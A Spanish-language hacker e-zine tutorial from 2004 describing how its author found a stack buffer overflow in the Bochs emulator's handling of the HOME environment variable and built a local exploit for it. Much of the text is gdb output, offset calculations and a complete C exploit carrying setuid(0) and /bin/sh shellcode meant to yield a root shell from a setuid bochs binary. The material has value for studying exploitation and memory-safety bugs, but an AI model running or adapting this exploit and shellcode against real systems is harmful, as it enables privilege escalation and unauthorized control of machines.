@@ -1,0 +1,557 @@
+-[ 0x05 ]--------------------------------------------------------------------
+-[ Buffer Overflow ]---------------------------------------------------------
+-[ by SeSoX ]--------------------------------------------------------SET-31--
+
+
+              _________________________________________________________
+              $                                                       $
+              $  Mi primer exploit (buffer overflow de bochs  v1.0)   $
+              $                                                       $
+              $  Escrito por SeSoX (sesox at govannom dot org)        $
+              $                                                       $
+              $      Creado para http://www.govannom.org              $
+              $                                                       $
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+        1.- Agradecimientos
+        2.- Introduccion
+        3.- Sistemas vulnerables
+        4.- Provocando el desbordamiento
+        5.- Analizando el desbordamiento 
+        6.- Obteniendo los datos necesarios para el exploit
+        7.- Creando el exploit
+        8.- Despedida
+
+
+1.- Agradecimientos
+    ^^^^^^^^^^^^^^^
+
+        Se que normalmente esto de los agradecimientos va al final del texto
+pero dado q en este caso tengo muy claro que sin los textos de cierta gente
+no podria haber adquirido los conocimientos que ahora tengo, paso a agradecer.
+Queria agradecer a Raise los textos que ha escrito sobre buffer overflows
+concretamente y a honoriak sus traducciones pq gracias a esos textos he podido
+aprender muchisimo y he pasado ratos muy divertidos. De verdad muchas gracias!!
+Tambien aprobechar para agradecer a toda la gente q escribe y comparte sus
+conocimientos con los demas sin esperar nada a cambio. 
+
+
+2.- Introduccion
+    ^^^^^^^^^^^^
+
+        Bien, una vez dadas las gracias, ya me kedao mas agusto :) asi que
+pasemos a explicar algunas cosillas sobre este texto, lo que voy a hacer es
+intentar explicar todos los pasos que segui para analizar el bug q encontre en
+bochs y lo que hice para crear el exploit. Comentar tambien que es el primer
+bug que he encontrado y el unico exploit que he hecho, todo un subidon de
+adrenalina en su momento, esa sensacion por la que merece la pena pasar horas
+y horas delante del pc aprendiendo y cacharreando, os lo aseguro ;D si no
+fuera por esos momentos hace tiempo que me hubiera dedicado a hacer otras
+cosas en mi tiempo libre (y no tan libre ;).
+
+Comentar tambien que mis conocimientos de programacion son muy reducidos y
+los que he adquirido sobre buffer overflows se limitan a lo q he aprendido
+leyendo textos, por lo que es posible q meta la pata en algun momento del
+texto, o que haya cosas que se puedan hacer usando otros metodos mejores o
+mas rapidos, si quereis podeis enviarme un mail para q lo corrija o mejore y
+sino, pues nada ;PP
+
+Bueno, pasemos ya a comentar algunas cosillas sobre el bug q sino me enrollo
+mucho e igual os aburris jeje ;)
+
+        Que es bochs ? pues bueno, es un emulador tipo vmware o virtual PC
+que corre bajo linux y win$ux (kiza tambien sobre ppc, no estoy seguro). 
+Nosotros trabajaremos con la version para linux.
+
+        Que bug tiene ? pues bien, el bug es uno muy conocido y la verdad es que
+no aporta nada nuevo, es un bug de buffer overflow y ocurre pq no se comprueba
+la longitud de una variable de entorno.
+
+        Pq otro texto de buffer overflows ? Bueno, no voy a explicar los buffer
+overflows ni nada parecido, lo que pretendo con este texto es explicar donde
+localize el fallo, como lo analize y como cree el exploit, obteniendo la return
+addres y demas, es decir, que tengo pensado que sea mas practico que otra cosa
+(espero cumplirlo segun siga escribiendo estas lineas ;).
+
+        Q herramientas usaremos ? pues voy a usar el gdb, vi y gcc.
+
+
+3.- Sistemas vulnerables
+    ^^^^^^^^^^^^^^^^^^^^
+
+No he testeado todas las versiones de bochs, pero se q son vulnerables las
+siguientes versiones:
+
+	bochs 2.0.1, 2.0.2, 2.1.pre1, 2.1.pre2 y 2.1
+
+
+4.- Provocando el desbordamiento
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Como en otros muchos bugs (por no decir todos) para que se produzca el
+desbordamiento se tienen que cumplir una serie de requisitos, en nuestro caso
+lo que tiene que ocurrir es que el programa no encuentre ninguno de estos
+ficheros de configuracion:
+
+	 .bochsrc, bochsrc, bochsrc.txt
+
+Cuando el programa no encuentre ninguno de estos ficheros, utilizara la
+variable de entorno $HOME para buscar el fichero de configuracion y entonces
+sera cuando ocurra el desbordamiento, por lo tanto compilamos el porograma q
+hemos descargado, yo usare bochs-2.0.2 y lo compilamos (no es necesario
+instalarlo). Ahora si quereis podeis ejecutar ./bochs para ver que nos muestra
+una salida normal y el programa funciona correctamente, bien, hemos dicho que
+el desbordamiento se produce por la variable HOME asi que agamosle un pekeño
+cambio para conseguir que se produzca el desbordamiento que andamos buscando,
+concretamente el cambio que haremos sera el siguiente (no os olvideis de borrar
+los ficheros que comentamos antes si es que existen):
+
+     export HOME=`perl -e "printf 'a'x1000"`
+
+NOTA: Si no os funciona con el numero q uso, probar con uno mas grande, en
+otros sistemas es posible q cambie este valor aunq creo q con 1000 sera
+suficiente para todo el mundo ;).
+
+Bien una vez echo esto podemos ejecutar bochs con ./bochs y veremos como nos
+dice Segmentation fault, bueno, con esto ya hemos conseguido que el programa
+se haya desbordado. Emocionante ? jeje, pues sigamos adelante a ver pq se ha
+producido este error.
+
+
+5.- Analizando el desbordamiento
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+     Bueno, ya hemos conseguido el seg fault y seguimos adelante, antes de nada
+comentar por si no lo sabeis que un segmentation fault se puede producir por
+muchos motivos aparte de por un buffer overflow por lo que no siempre que un
+programa nos de este error tiene pq ser vulnerable a este tipo de bugs, puede
+ser q sea por otro bug o puede q aunq sea un error de programacion no sea
+ningun fallo de seguridad que podamos explotar, bueno, dicho esto echemos un
+vistazo mas a fondo.
+
+Como saber si el bug corresponde a un buffer overflow ? pues bien, la forma
+mas sencilla es creando el fichero core y analizarlo con gdb para ello lo
+primero es permitir q nuestro usuario pueda crear ficheros core con:
+
+     ulimit -c 9999
+
+Y una vez echo esto volveremos a ejecutar ./bochs, esta vez ha cambiado algo
+en vez de decirnos solo Segmentation fault nos dira algo mas, concretamente:
+Segmentation fault (core dumped). Bien, ahora nos ha generado un fichero core
+que podremos analizar con gdb y nos facilitara mucha informacion interesante
+si quereis podeis comprobar que teneis el fichero core en el directorio donde
+estais ejecutando bochs. Pasemos ahora a ojearlo utilizando gdb, para ello
+hacemos lo siguiente:
+
+     gdb ./bochs core
+
+Bien, esto nos saca un monton de lineas por pantalla y las ultimas que salen
+son las siguientes:
+
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0x61616161 in ?? ()
+(gdb)
+
+La que mas nos interesa a nosotros es la ultima que dice: #0  0x61616161 in ??
+logicamente no me referia a la de prompt ;). Bien, y que nos dice esta linea ?
+pues nos esta indicando que el Segmentation fault se ha producido pq el bochs
+intetaba acceder a la direccion de memoria 0x61616161 y claro, como el sistema
+no se lo permite pues casca. Y... de donde narices ha salido esa direccion ?
+pues la hemos creado nosotros jejei, cada 61 de esa direccion corresponde a una
+letra 'a' y si recordamos, en la variable HOME hemos metido muchas de esas, asi
+que lo q ha pasado es que hemos sobreescrito la direccion de retorno con todas
+esas 'a' que hemos metido en HOME, el programa intento acceder a esa direccion
+y se proboco el error (espero q haya kedado claro). Visto esto parece claro que
+el bug q hemos encontrado es un buffer overflow (apartir de ahora bof q es mas
+cortito ;). Si no sale esa direccion al final puede ser por 2 motivos, que el
+seg fault no corresponda a un bof o que necesitemos meter en HOME mas de 1000
+caracteres para generar el desbordamiento. Pero vamos, siempre que de un seg
+fault y analizando el core como hemos echo aparezca en esa direccion el numero
+que corresponda con las letras que hemos metido en HOME (en este caso) sabemos
+seguro que se trata de un bof.
+
+Esto es una pasada!! ya tenemos un bof a la vista jeje, y... donde ocurre este
+error en el programa ? pues ahora mismo vamos a ello, veremos a ver donde esta
+el codigo que provoca este error (otra de las maravillas que nos permite el
+software libre).
+
+Bien, para ello nada mas sencillo que colocarnos en el directorio en el que
+tenemos las fuentes y hacer un 'grep -n HOME *' lo que nos devuelve unicamente
+una coincidencia en el fichero main.cc en la linea 2293, pues ale, vamos alla
+a ver si es lo que buscamos, editamos el fichero (en mi caso con el vi) y vamos
+a la esa linea, lo q tenemos es:
+
+      // only try this on unix
+    case 3:
+      {
+      char *ptr = getenv("HOME");
+      if (ptr) sprintf (rcfile, "%s/.bochsrc", ptr);
+      }
+      break;
+     case 4: strcpy (rcfile, "/etc/bochsrc"); break;
+
+Pero bueno!! q tenemos aki! mmmmm yo a primera vista no sabia bien lo que hacia
+este trozo asi que tuve q mirar el man de sprintf (ya dije q no tenia mucha
+idea de programar en c) total que descubri que la funcion sprintf imprime una
+cadena pero no en stdout sino en un puntero que en este caso es rcfile, el caso
+ideal para que se produzca un bof, asi que vamos a ver donde y como esta
+definida la variable rcfile.... ¡aki esta! un poco mas arriba:
+
+  FILE *fd = NULL;
+  char rcfile[512];
+  Bit32u retry = 0, found = 0;
+
+Bien, ya tenemos la variable y resulta que ha sido definida con un tamaño fijo
+de 512 bytes... ahora pensemos: sprintf copia en la variable rcfile lo que
+contiene ptr, q es un puntero a HOME + '/.bochsrc' pero q ocurre si nosotros
+hacemos que la variable HOME ocupe 1000 bytes como ya hemos echo ? pues lo que
+todos sabeis, que como no entra en rcfile machaca todo lo que este por debajo
+y entre esas cosas esta la ret (direccion de retorno). Pues bueno, ya sabemos
+donde esta el error (linea 2293) e incluso como podriamos solucionarlo ¿verdad?
+Bien, esto ha estado cojonudo, pero ahora vallamos a hacer el exploit ¿no os
+parece q seria interesante? pues ale, vamos a ello!! :D
+
+
+6.- Obteniendo los datos necesarios para el exploit
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Vamos a crear nuestro primer exploit (o por lo menos ese fue mi caso :) bien
+antes de empezar necesitamos un par de cosas, primero el tamaño de la variable
+que vamos a desbordar (aunq no es imprescindible) que ya sabemos que es de 512
+bytes, tambien necesitamos saber cual es la direccion de la pila/esp, tambien
+la distancia que hay desde esp asta el principio de nuestra variable que sera
+lo que llamemos OFFSET, tambien la return addres (apartir de ahora ret) que
+sera 'esp + OFFSET' y por ultimo la distancia desde nuestra variable asta el
+lugar donde se encuentra eip que es donde almacenaremos la tan preciada ret.
+
+Bueno, pues vamos al lio, lo primero que vamos a buscar sera la direccion de
+esp q tambien es lo mas facil y cuando la tengamos buscaremos el OFFSET y asi
+ya tendremos tambien la ret, al atakeeee ;D
+
+Primero definimos HOME de esta manera para que cuando ejecutemos bochs nuestra
+variable rcfile contenga una sucesion de 61616161 y asi podamos localizar donde
+se encuentra la variable, recordais q si rellenabamos de 'a'-s la variable
+nosotros lo veremos como 61616161 ¿verdad?
+
+     # export HOME=`perl -e "printf 'a'x1000"`
+     # gdb bochs
+
+Una vez dentro de gdb ejecutamos bochs con 'r' y el programa para con un seg
+fault.
+
+     > r
+     Starting program: /home/sesox/bochs/bochs-2.0.2/bochs
+     ========================================================================
+                            Bochs x86 Emulator 2.0.2
+                                January 21, 2003
+     ========================================================================
+
+     Program received signal SIGSEGV, Segmentation fault.
+     0x61616161 in ?? ()
+     Current language:  auto; currently c
+     >
+
+Ya nos hemos detenido despues de que copie nuestra variable en la memoria por
+lo tanto vamos a ver cual es la direccion de la pila y vamos a sacar el OFFSET
+y nuestra ret. Para obtener la direccion de esp haremos lo siguiente:
+
+     > info reg
+     eax            0x0      0
+     ecx            0x4026b9a0       1076279712
+     edx            0x5      5
+     ebx            0x61616161       1633771873
+     esp            0xbffff820       0xbffff820
+     ebp            0x61616161       0x61616161
+     esi            0x61616161       1633771873
+     edi            0x61616161       1633771873
+     eip            0x61616161       0x61616161
+     ...........
+
+NOTA: Como podeis observar hay vastantes 61 por ahi sueltos, y es que hemos
+machacado unas cuantas cosas con nuestra variable HOME jejeje. 
+
+Ahora sabemos que esp esta localizada en la direccion 0xbffff820 asi que
+teniendo eso miremos que hay en esp pq por ahi tienen q estar todas nuestras
+letras ;) y por lo tanto nuestro OFFSET.
+
+     > x/100x $esp
+     .................
+     0xbffffd10:     0x722f3d44      0x2f746f6f      0x68636f62      0x6f622f73
+     0xbffffd20:     0x2d736863      0x2e302e32      0x4e490032      0x52545550
+     0xbffffd30:     0x652f3d43      0x692f6374      0x7475706e      0x4a006372
+     0xbffffd40:     0x5f415641      0x454d4f48      0x73752f3d      0x696c2f72
+     0xbffffd50:     0x616a2f62      0x4c006176      0x3d474e41      0x4f480043
+     0xbffffd60:     0x613d454d      0x61616161      0x61616161      0x61616161
+     0xbffffd70:     0x61616161      0x61616161      0x61616161      0x61616161
+     0xbffffd80:     0x61616161      0x61616161      0x61616161      0x61616161
+     0xbffffd90:     0x61616161      0x61616161      0x61616161      0x61616161
+     0xbffffda0:     0x61616161      0x61616161      0x61616161      0x61616161
+     .................
+     > 
+
+Con esto vamos mostrando lo que contiene la pila, tras usar el intro unas
+cuantas veces (en mi caso 4) vemos que ya nos aparecen nuestras 'a'-s que
+como podemos observar son los 0x61616161 por lo tanto ya tenemos la direccion
+en la que empieza nuestra variable q en este caso es: 0xbffffd90
+Como veis no me he molestado en calcular donde esta el primer 61 ya que no
+es necesario ni recomendable usarlo, es mejor tirar un poco de largo y obtener
+una direccion que este un poco mas alante. Incluso a veces se podrian hacer
+algunos calculos para saltar algo mas adelante de lo que vamos a saltar
+nosotros, pero bueno, con esto de momento nos valdra.
+
+Ahora ya tenemos la direccion de la pila q es 0xbffff820 y la de nuestra
+variable q es 0xbffffd90. Si hacemos una resta en hexadeciaml nos dara la
+distancia entre ambas que es lo q sera nuestro OFFSET y el resultado en este
+caso es: 570 q si lo pasamos a decimal q es como lo usaremos en nuestro exploit
+sera 1392 y ahora que tenemos nuestro OFFSET tambien podemos calcular la
+ret que es: esp + OFFSET
+
+NOTA: para obtener el offset podeis usar una calculadora o este pekeño programa
+echo en c, si usais la calculadora no olvideis hacer la resta en hexa y pasar el
+resultado a decimal.
+     #include <stdio.h>
+     main(){
+     char *esp,*var;
+     esp = 0xbffff820;   //Aqui poneis vuestros valores de esp y de la variable
+     var = 0xbffffd90;   //que vais a desbordar.
+     printf("OFFSET = %d\n", var - esp);
+     }
+
+Ya tenemos casi todos los datos, unicamente nos queda 1 que es la distancia
+que hay desde el principio de nuestra variable asta eip que es donde tenemos
+que almacenar la ret.
+
+Para obtener esta distancia es posible que exista alguna forma mejor, pero yo
+la unica que conozco es ir probando asta que la encuentro, de todas formas esta
+claro que la distancia que buscamos siempre tiene q ser mayor a nuestra
+variable ya que sino, seguiriamos dentro de la variable ¿logico no? pues con
+eso sabemos que la distancia sera mayor de 512, vamos a ir probando:
+
+     # export HOME=`perl -e "print 'a'x520"`
+     # gdb bochs
+     ..............
+     > r
+     Starting program: /home/sesox/bochs/bochs-2.0.2/bochs
+     ========================================================================
+                            Bochs x86 Emulator 2.0.2
+                                January 21, 2003
+     ========================================================================
+
+     Program received signal SIGSEGV, Segmentation fault.
+     0x72736863 in ?? ()
+     Current language:  auto; currently c
+
+Esa direccion que vemos ahi (0x72736863) es eip, y conoceremos a cuanto se
+encuentra de nuestra variable cuando definiendo HOME con un numero de 'a'-s
+ese numero sea 0x61616161, igual que ocurria antes, pero ahora tenemos que
+buscar el numero exacto que aga que eip valga 0x61616161 pero sin escribir
+mas alla, por lo tanto salimos de gdb y seguimos probando:
+
+     # export HOME=`perl -e "print 'a'x542"`
+     # gdb bochs
+     ..............
+     > r
+     Starting program: /home/sesox/bochs/bochs-2.0.2/bochs
+     ========================================================================
+                            Bochs x86 Emulator 2.0.2
+                                January 21, 2003
+     ========================================================================
+
+     Program received signal SIGSEGV, Segmentation fault.
+     0x2e2f6161 in ?? ()
+     Current language:  auto; currently c
+
+
+Bueno bueno!! parece q nos vamos acercando, como podeis ver en la direccion
+aparecen 2 'a'-s por lo que es posible q nuestro numero sea 544 (yo ya lo
+sabia y por eso he puesto 542 jeje, es que sino es mucho pastear y se me hace
+el texto eterno jejeje, pero vosotros ir probando, merece la pena y no se
+tarda tanto ;) Bien, volvemos a salir de gdb y probamos otra vez, en este
+caso con 544 y vamos a cambiar la letra 'a' por una 'B' ¿pq? pues por que
+me apetece jejeje, sin mas:
+
+     # export HOME=`perl -e "print 'B'x544"`
+     # gdb bochs
+     ..............
+     > r
+     Starting program: /home/sesox/bochs/bochs-2.0.2/bochs
+     ========================================================================
+                            Bochs x86 Emulator 2.0.2
+                                January 21, 2003
+     ========================================================================
+
+     Program received signal SIGSEGV, Segmentation fault.
+     0x42424242 in ?? ()
+     Current language:  auto; currently c
+
+Perfecto!! la 'B' en hexadecimal es 0x42 y parece ser q ahora ya tenemos toda
+la eip sobreescrita por lo tanto ya sabemos a que distancia se encuentra eip
+de nuestra variable, esta distancia es 544 y debemos tenerla en cuenta pq es
+ahi donde tenemos q poner la nueva eip (en nuestro caso la ret) para que valla
+a donde nosotros queramos (esp + OFFSET) y asi ejecute lo que nos salga de las
+narices. De todas formas 544 es la distancia asta el final de eip y nosotros
+tenemos que hacer que eip sea = a ret por lo tanto meteremos nuestra ret a una
+distancia de 540 y ocupara de 540 a 544 que es donde esta eip.
+
+Bueno, creo que ya tenemos todo lo que necesitamos y si se me olvida algo pos
+ya lo buscaremos mas tard jeje, ahora vamos a codear el exploit.
+
+
+
+7.- Creando el exploit
+    ^^^^^^^^^^^^^^^^^^
+
+Bueno bueno, ya empiezo a estar un poco cansaillo de tanto escribir, menos mal
+q estoy mas solo q la 1 en un pueblo perdido de dios y como no tengo con kien
+hablar me entretengo hablando con.... ¡coño! con mi portatil! q triste jejeje
+bueno, como ahora me estas leyento tu, creo q eso me vale :)
+
+Ale, vamos a ver si creamos ese peaso de exploit q ya keda pokito para acabar.
+Primero un poco de teoria (creo), vamos a ver... asta ahora ni siquiera he
+mencionado la shellcode pero es algo muy importante aunq como dije no pienso
+explicar tema de bof ni nada deso, pero bueno, q sepais q la shellcode es
+codigo asm y va a ser el codigo que nosotros queremos que se ejecute, en este
+caso el codigo va a ser el tipico codigo que nos da una shell asi que
+vasicamente lo que hace es un setuid y luego ejecutara sh. Para obtener una
+shellcode teneis 2 opciones, os buscais una por ahi q hay muchas y para
+distintos sistemas o sino os haceis una que es mucho mas dibertido. Para hacer
+una shellcode yo os recomiento un texto q esta en govannom.org que es:
+Diseñando shellcodes en linux IA-32(x86), lo podeis encontrar en la seccion
+de seguridad -> buffer overflows y es con el q yo aprendi, a mi parecer un
+texto excelente aunq mas alla de ese texto hay otras cosas que aprender, pero
+para empezar es muy recomendable.
+
+Bueno, y tras toda esta parrafada vamos a empezar con lo nuestro, la creacion
+del exploit iuuupiiiiii!!! jejeje
+
+Primero logicamente incluimos los headers que nos agan falta, luego metemos
+la shellcode, en mi caso:
+
+static char shellcode[]=
+        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"  //setuid(0)
+//      "\x31\xc0\xb0\x2e\xcd\x80"          //setgid(0)
+        "\x31\xc9\x31\xd2\x51\x68\x6e\x2f"
+        "\x73\x68\x68\x2f\x2f\x62\x69\x89"
+        "\xe3\x51\x53\x89\xe1\xb0\x0b\xcd"
+        "\x80\x31\xc0\xb0\x01\xcd\x80";
+
+/*
+Tras esto metemos una funcion que es la que nos va a permitir obtener la
+direccion de esp ¿como? ¿pero eso no lo teniamos ya? como os he comentado antes
+y por si alguien no se acuerda la esp cambia cada vez que se ejecuta bochs por
+lo tanto tenemos que obtenerla cada vez que ejecutemos el exploit, pero no pasa
+nada pq es algo muy sencillo, nada mas que crear esta funcion:
+*/
+
+char *get_sp() {
+   asm("movl %esp,%eax");
+}
+
+/*
+Asi cuando llamemos a get_sp() se nos dara la esp y listo, no tiene mas
+misterios, si quereis saber exactamente lo que hace aprender algo de asm o
+miraros el texto de shellcodes y seguro q lo entendereis facilmente ;) mas
+deberes jejeje.
+
+Bueno, lo siguiente sera definir algunas variables que necesitaremos en el
+exploit y que son las siguientes:
+*/
+
+#define NOP    0x90     // Definimos los NOP para linux
+#define BSIZE  512      // Tamaño de la variable que vamos a desbordar
+#define OFFSET 570      // Espacio desde el principio de la pila asta los NOP
+                        // Es posible q tengamos que modificar este valor
+
+// Y ahora empezamos ya con main y seguimos con mas variables:
+
+main(int argc, char *argv[]){
+
+char buffer[BSIZE+32];    // Tamaño desde el principio de la variable asta
+   // eip 512 + 32 = 544 es donde vamos a meter los NOP, la shellcode y la
+   // nueva eip. Tambien podemos hacer que esto valga solo 512 para meter los
+   // NOP y la shellcode y luego meter la ret en 512+28 = 540 ya que la ret
+   // Tiene que ir desde 540 asta 544, yo creo que seria mas correcto y mas
+   // limpio hacerlo de esta 2º forma, pero bueno, usaremos la 1º por q es la
+   // que yo utilice y no me apetece cambiarlo, solo q lo sepais ;).
+char *ret = get_sp()+OFFSET;  // La ret q ya dijimos que era esp+OFFSET
+
+clearenv();   // Limpiamos las variables de entorno (no es obligatorio pero yo
+              // personalmente recomiendo hacerlo), Por lo menos en este caso.
+
+memset(buffer,NOP,sizeof(buffer));
+// Llenamos toda la variable buffer con la instruccion NOP
+
+memcpy(buffer+(BSIZE-strlen(shellcode)-4), (char *)&shellcode, strlen(shellcode));
+// Metemos la shellcode al final de nuestra variable - el espacio para la ret
+
+memcpy(buffer+(sizeof(buffer)-4), (char *)&ret, 4);
+// Metemos la ret en los ultimos 4 bytes que es donde esta eip
+
+
+// Ahora definimos la variable HOME con todo ese mejunge
+  if(setenv("HOME", buffer, 1)==-1){
+        printf("No se ha posido meter el buffer en la variable HOME.\n");
+        return -1;
+  }
+
+// Y por ultimo ejecutamos bochs, que cogera la variable HOME con el mejunge
+// saltara a los NOP por la ret q hemos puesto, llegara a la shellcode, la
+// ejecutara y nos dara nuestra shell!!! ;D
+  if(execl("./bochs","./bochs",NULL)==-1){
+        printf("No se ha podido ejecutar bochs.\nSi lo tienes instalado, verifica q el path sea correcto.\n");
+        return -1;
+  }
+
+Pues parece q ya tenemos nuestro exploit terminado y solo queda ejecutarlo y
+deberia darnos una shell, eso si, tened en cuenta de que el programa tiene que
+estar setuid pq sino la shellcode falla. Si veis que aun asi no funciona jugar
+un poco con el OFFSET que puede ser que lo hayamos calculado mal, a mi al
+principio me paso eso, pero probando un poco consegui la shell :).
+
+Para terminar comentaros otra cosilla q no voy a explicar en este texto pq os
+voy a remitir a otro. Una vez tengais el exploit hecho funcionara pero solo en
+vuestro sistema y en sistemas (mas o menos) identicos al vuestro, la verdad
+es que es un poco rollo hacer un exploit y que luego solo rule en un equipo y
+para que funcione en otro tengamos que volver a buscar el OFFSET y kizas algun
+que otro dato, bueno, debeis saber que esto con exploits locales se puede
+evitar, el trabajo que hacemos nosotros de buscar los 0x61 dentro de esp para
+obtener el OFFSET se puede automatizar con un poco de programacion en c, lo que
+hacemos es practicamente lo mismo q con gdb pero digamos que es mas automatico,
+el mismo programa lo analiza y nos dice donde estan los 0x61. Lo que faltaria
+seria añadir algo de codigo al exploit y listo, y para hacerlo nada mejor que
+el texto de raise sobre Automatizacion de exploits locales bajo linux. El texto
+lo podeis encontrar tambien en www.govannom.org en la seccion Seguridad ->
+Buffer overflows y no tiene perdida, yo consegui meter el codigo en el exploit
+y hacer que funcionara bien, y como ya he dicho un par de veces no soy ningun
+experto en c asi que os animo a que probeis, esta muy bien.
+
+8.- Despedida
+    ^^^^^^^^^
+
+Si os sugen dudas o quereis comentar algo conmigo mandar un mail y asi puedo
+mejorar el texto o pasar un rato agradable charlando.
+
+Espero que hayais disfrutado leyendo este texto tanto como he disfrutado
+yo "jugando" con este bug y que hayais aprendido cosas nuevas, si es asi
+me sentire satisfecho de haber escrito el texto y por lo menos no habra
+sido en bano el tiempo que he empleado en ello.
+
+Un saludo a toda la gente q me conoce (asi no me olvido a nadie) y en
+especial a ASzY y a diotima^ q son los que me aguantan CASI sin protestar
+jejeje ;D
+
+Tambien un saludo al personaje anonimo ese q he conocido no hace mucho y
+que ha usado parte de su tiempo a explicarme y enseñarme algunas cosas.
+Muchas gracias tio!! tendria q haber mas gente como tu por este mundillo.
+
+Hasta la proxima! ;)
+
+
+Copyright (c) 2004 SeSoX.
+Se otorga permiso para copiar, distribuir y/o modificar este documento bajo
+los términos de la Licencia de Documentación Libre (FDL) GNU, Versión 1.2 o
+cualquier otra versión posterior publicada por la Free Software Foundation.
+http://www.gnu.org/copyleft/fdl.txt
+
+*EOF*
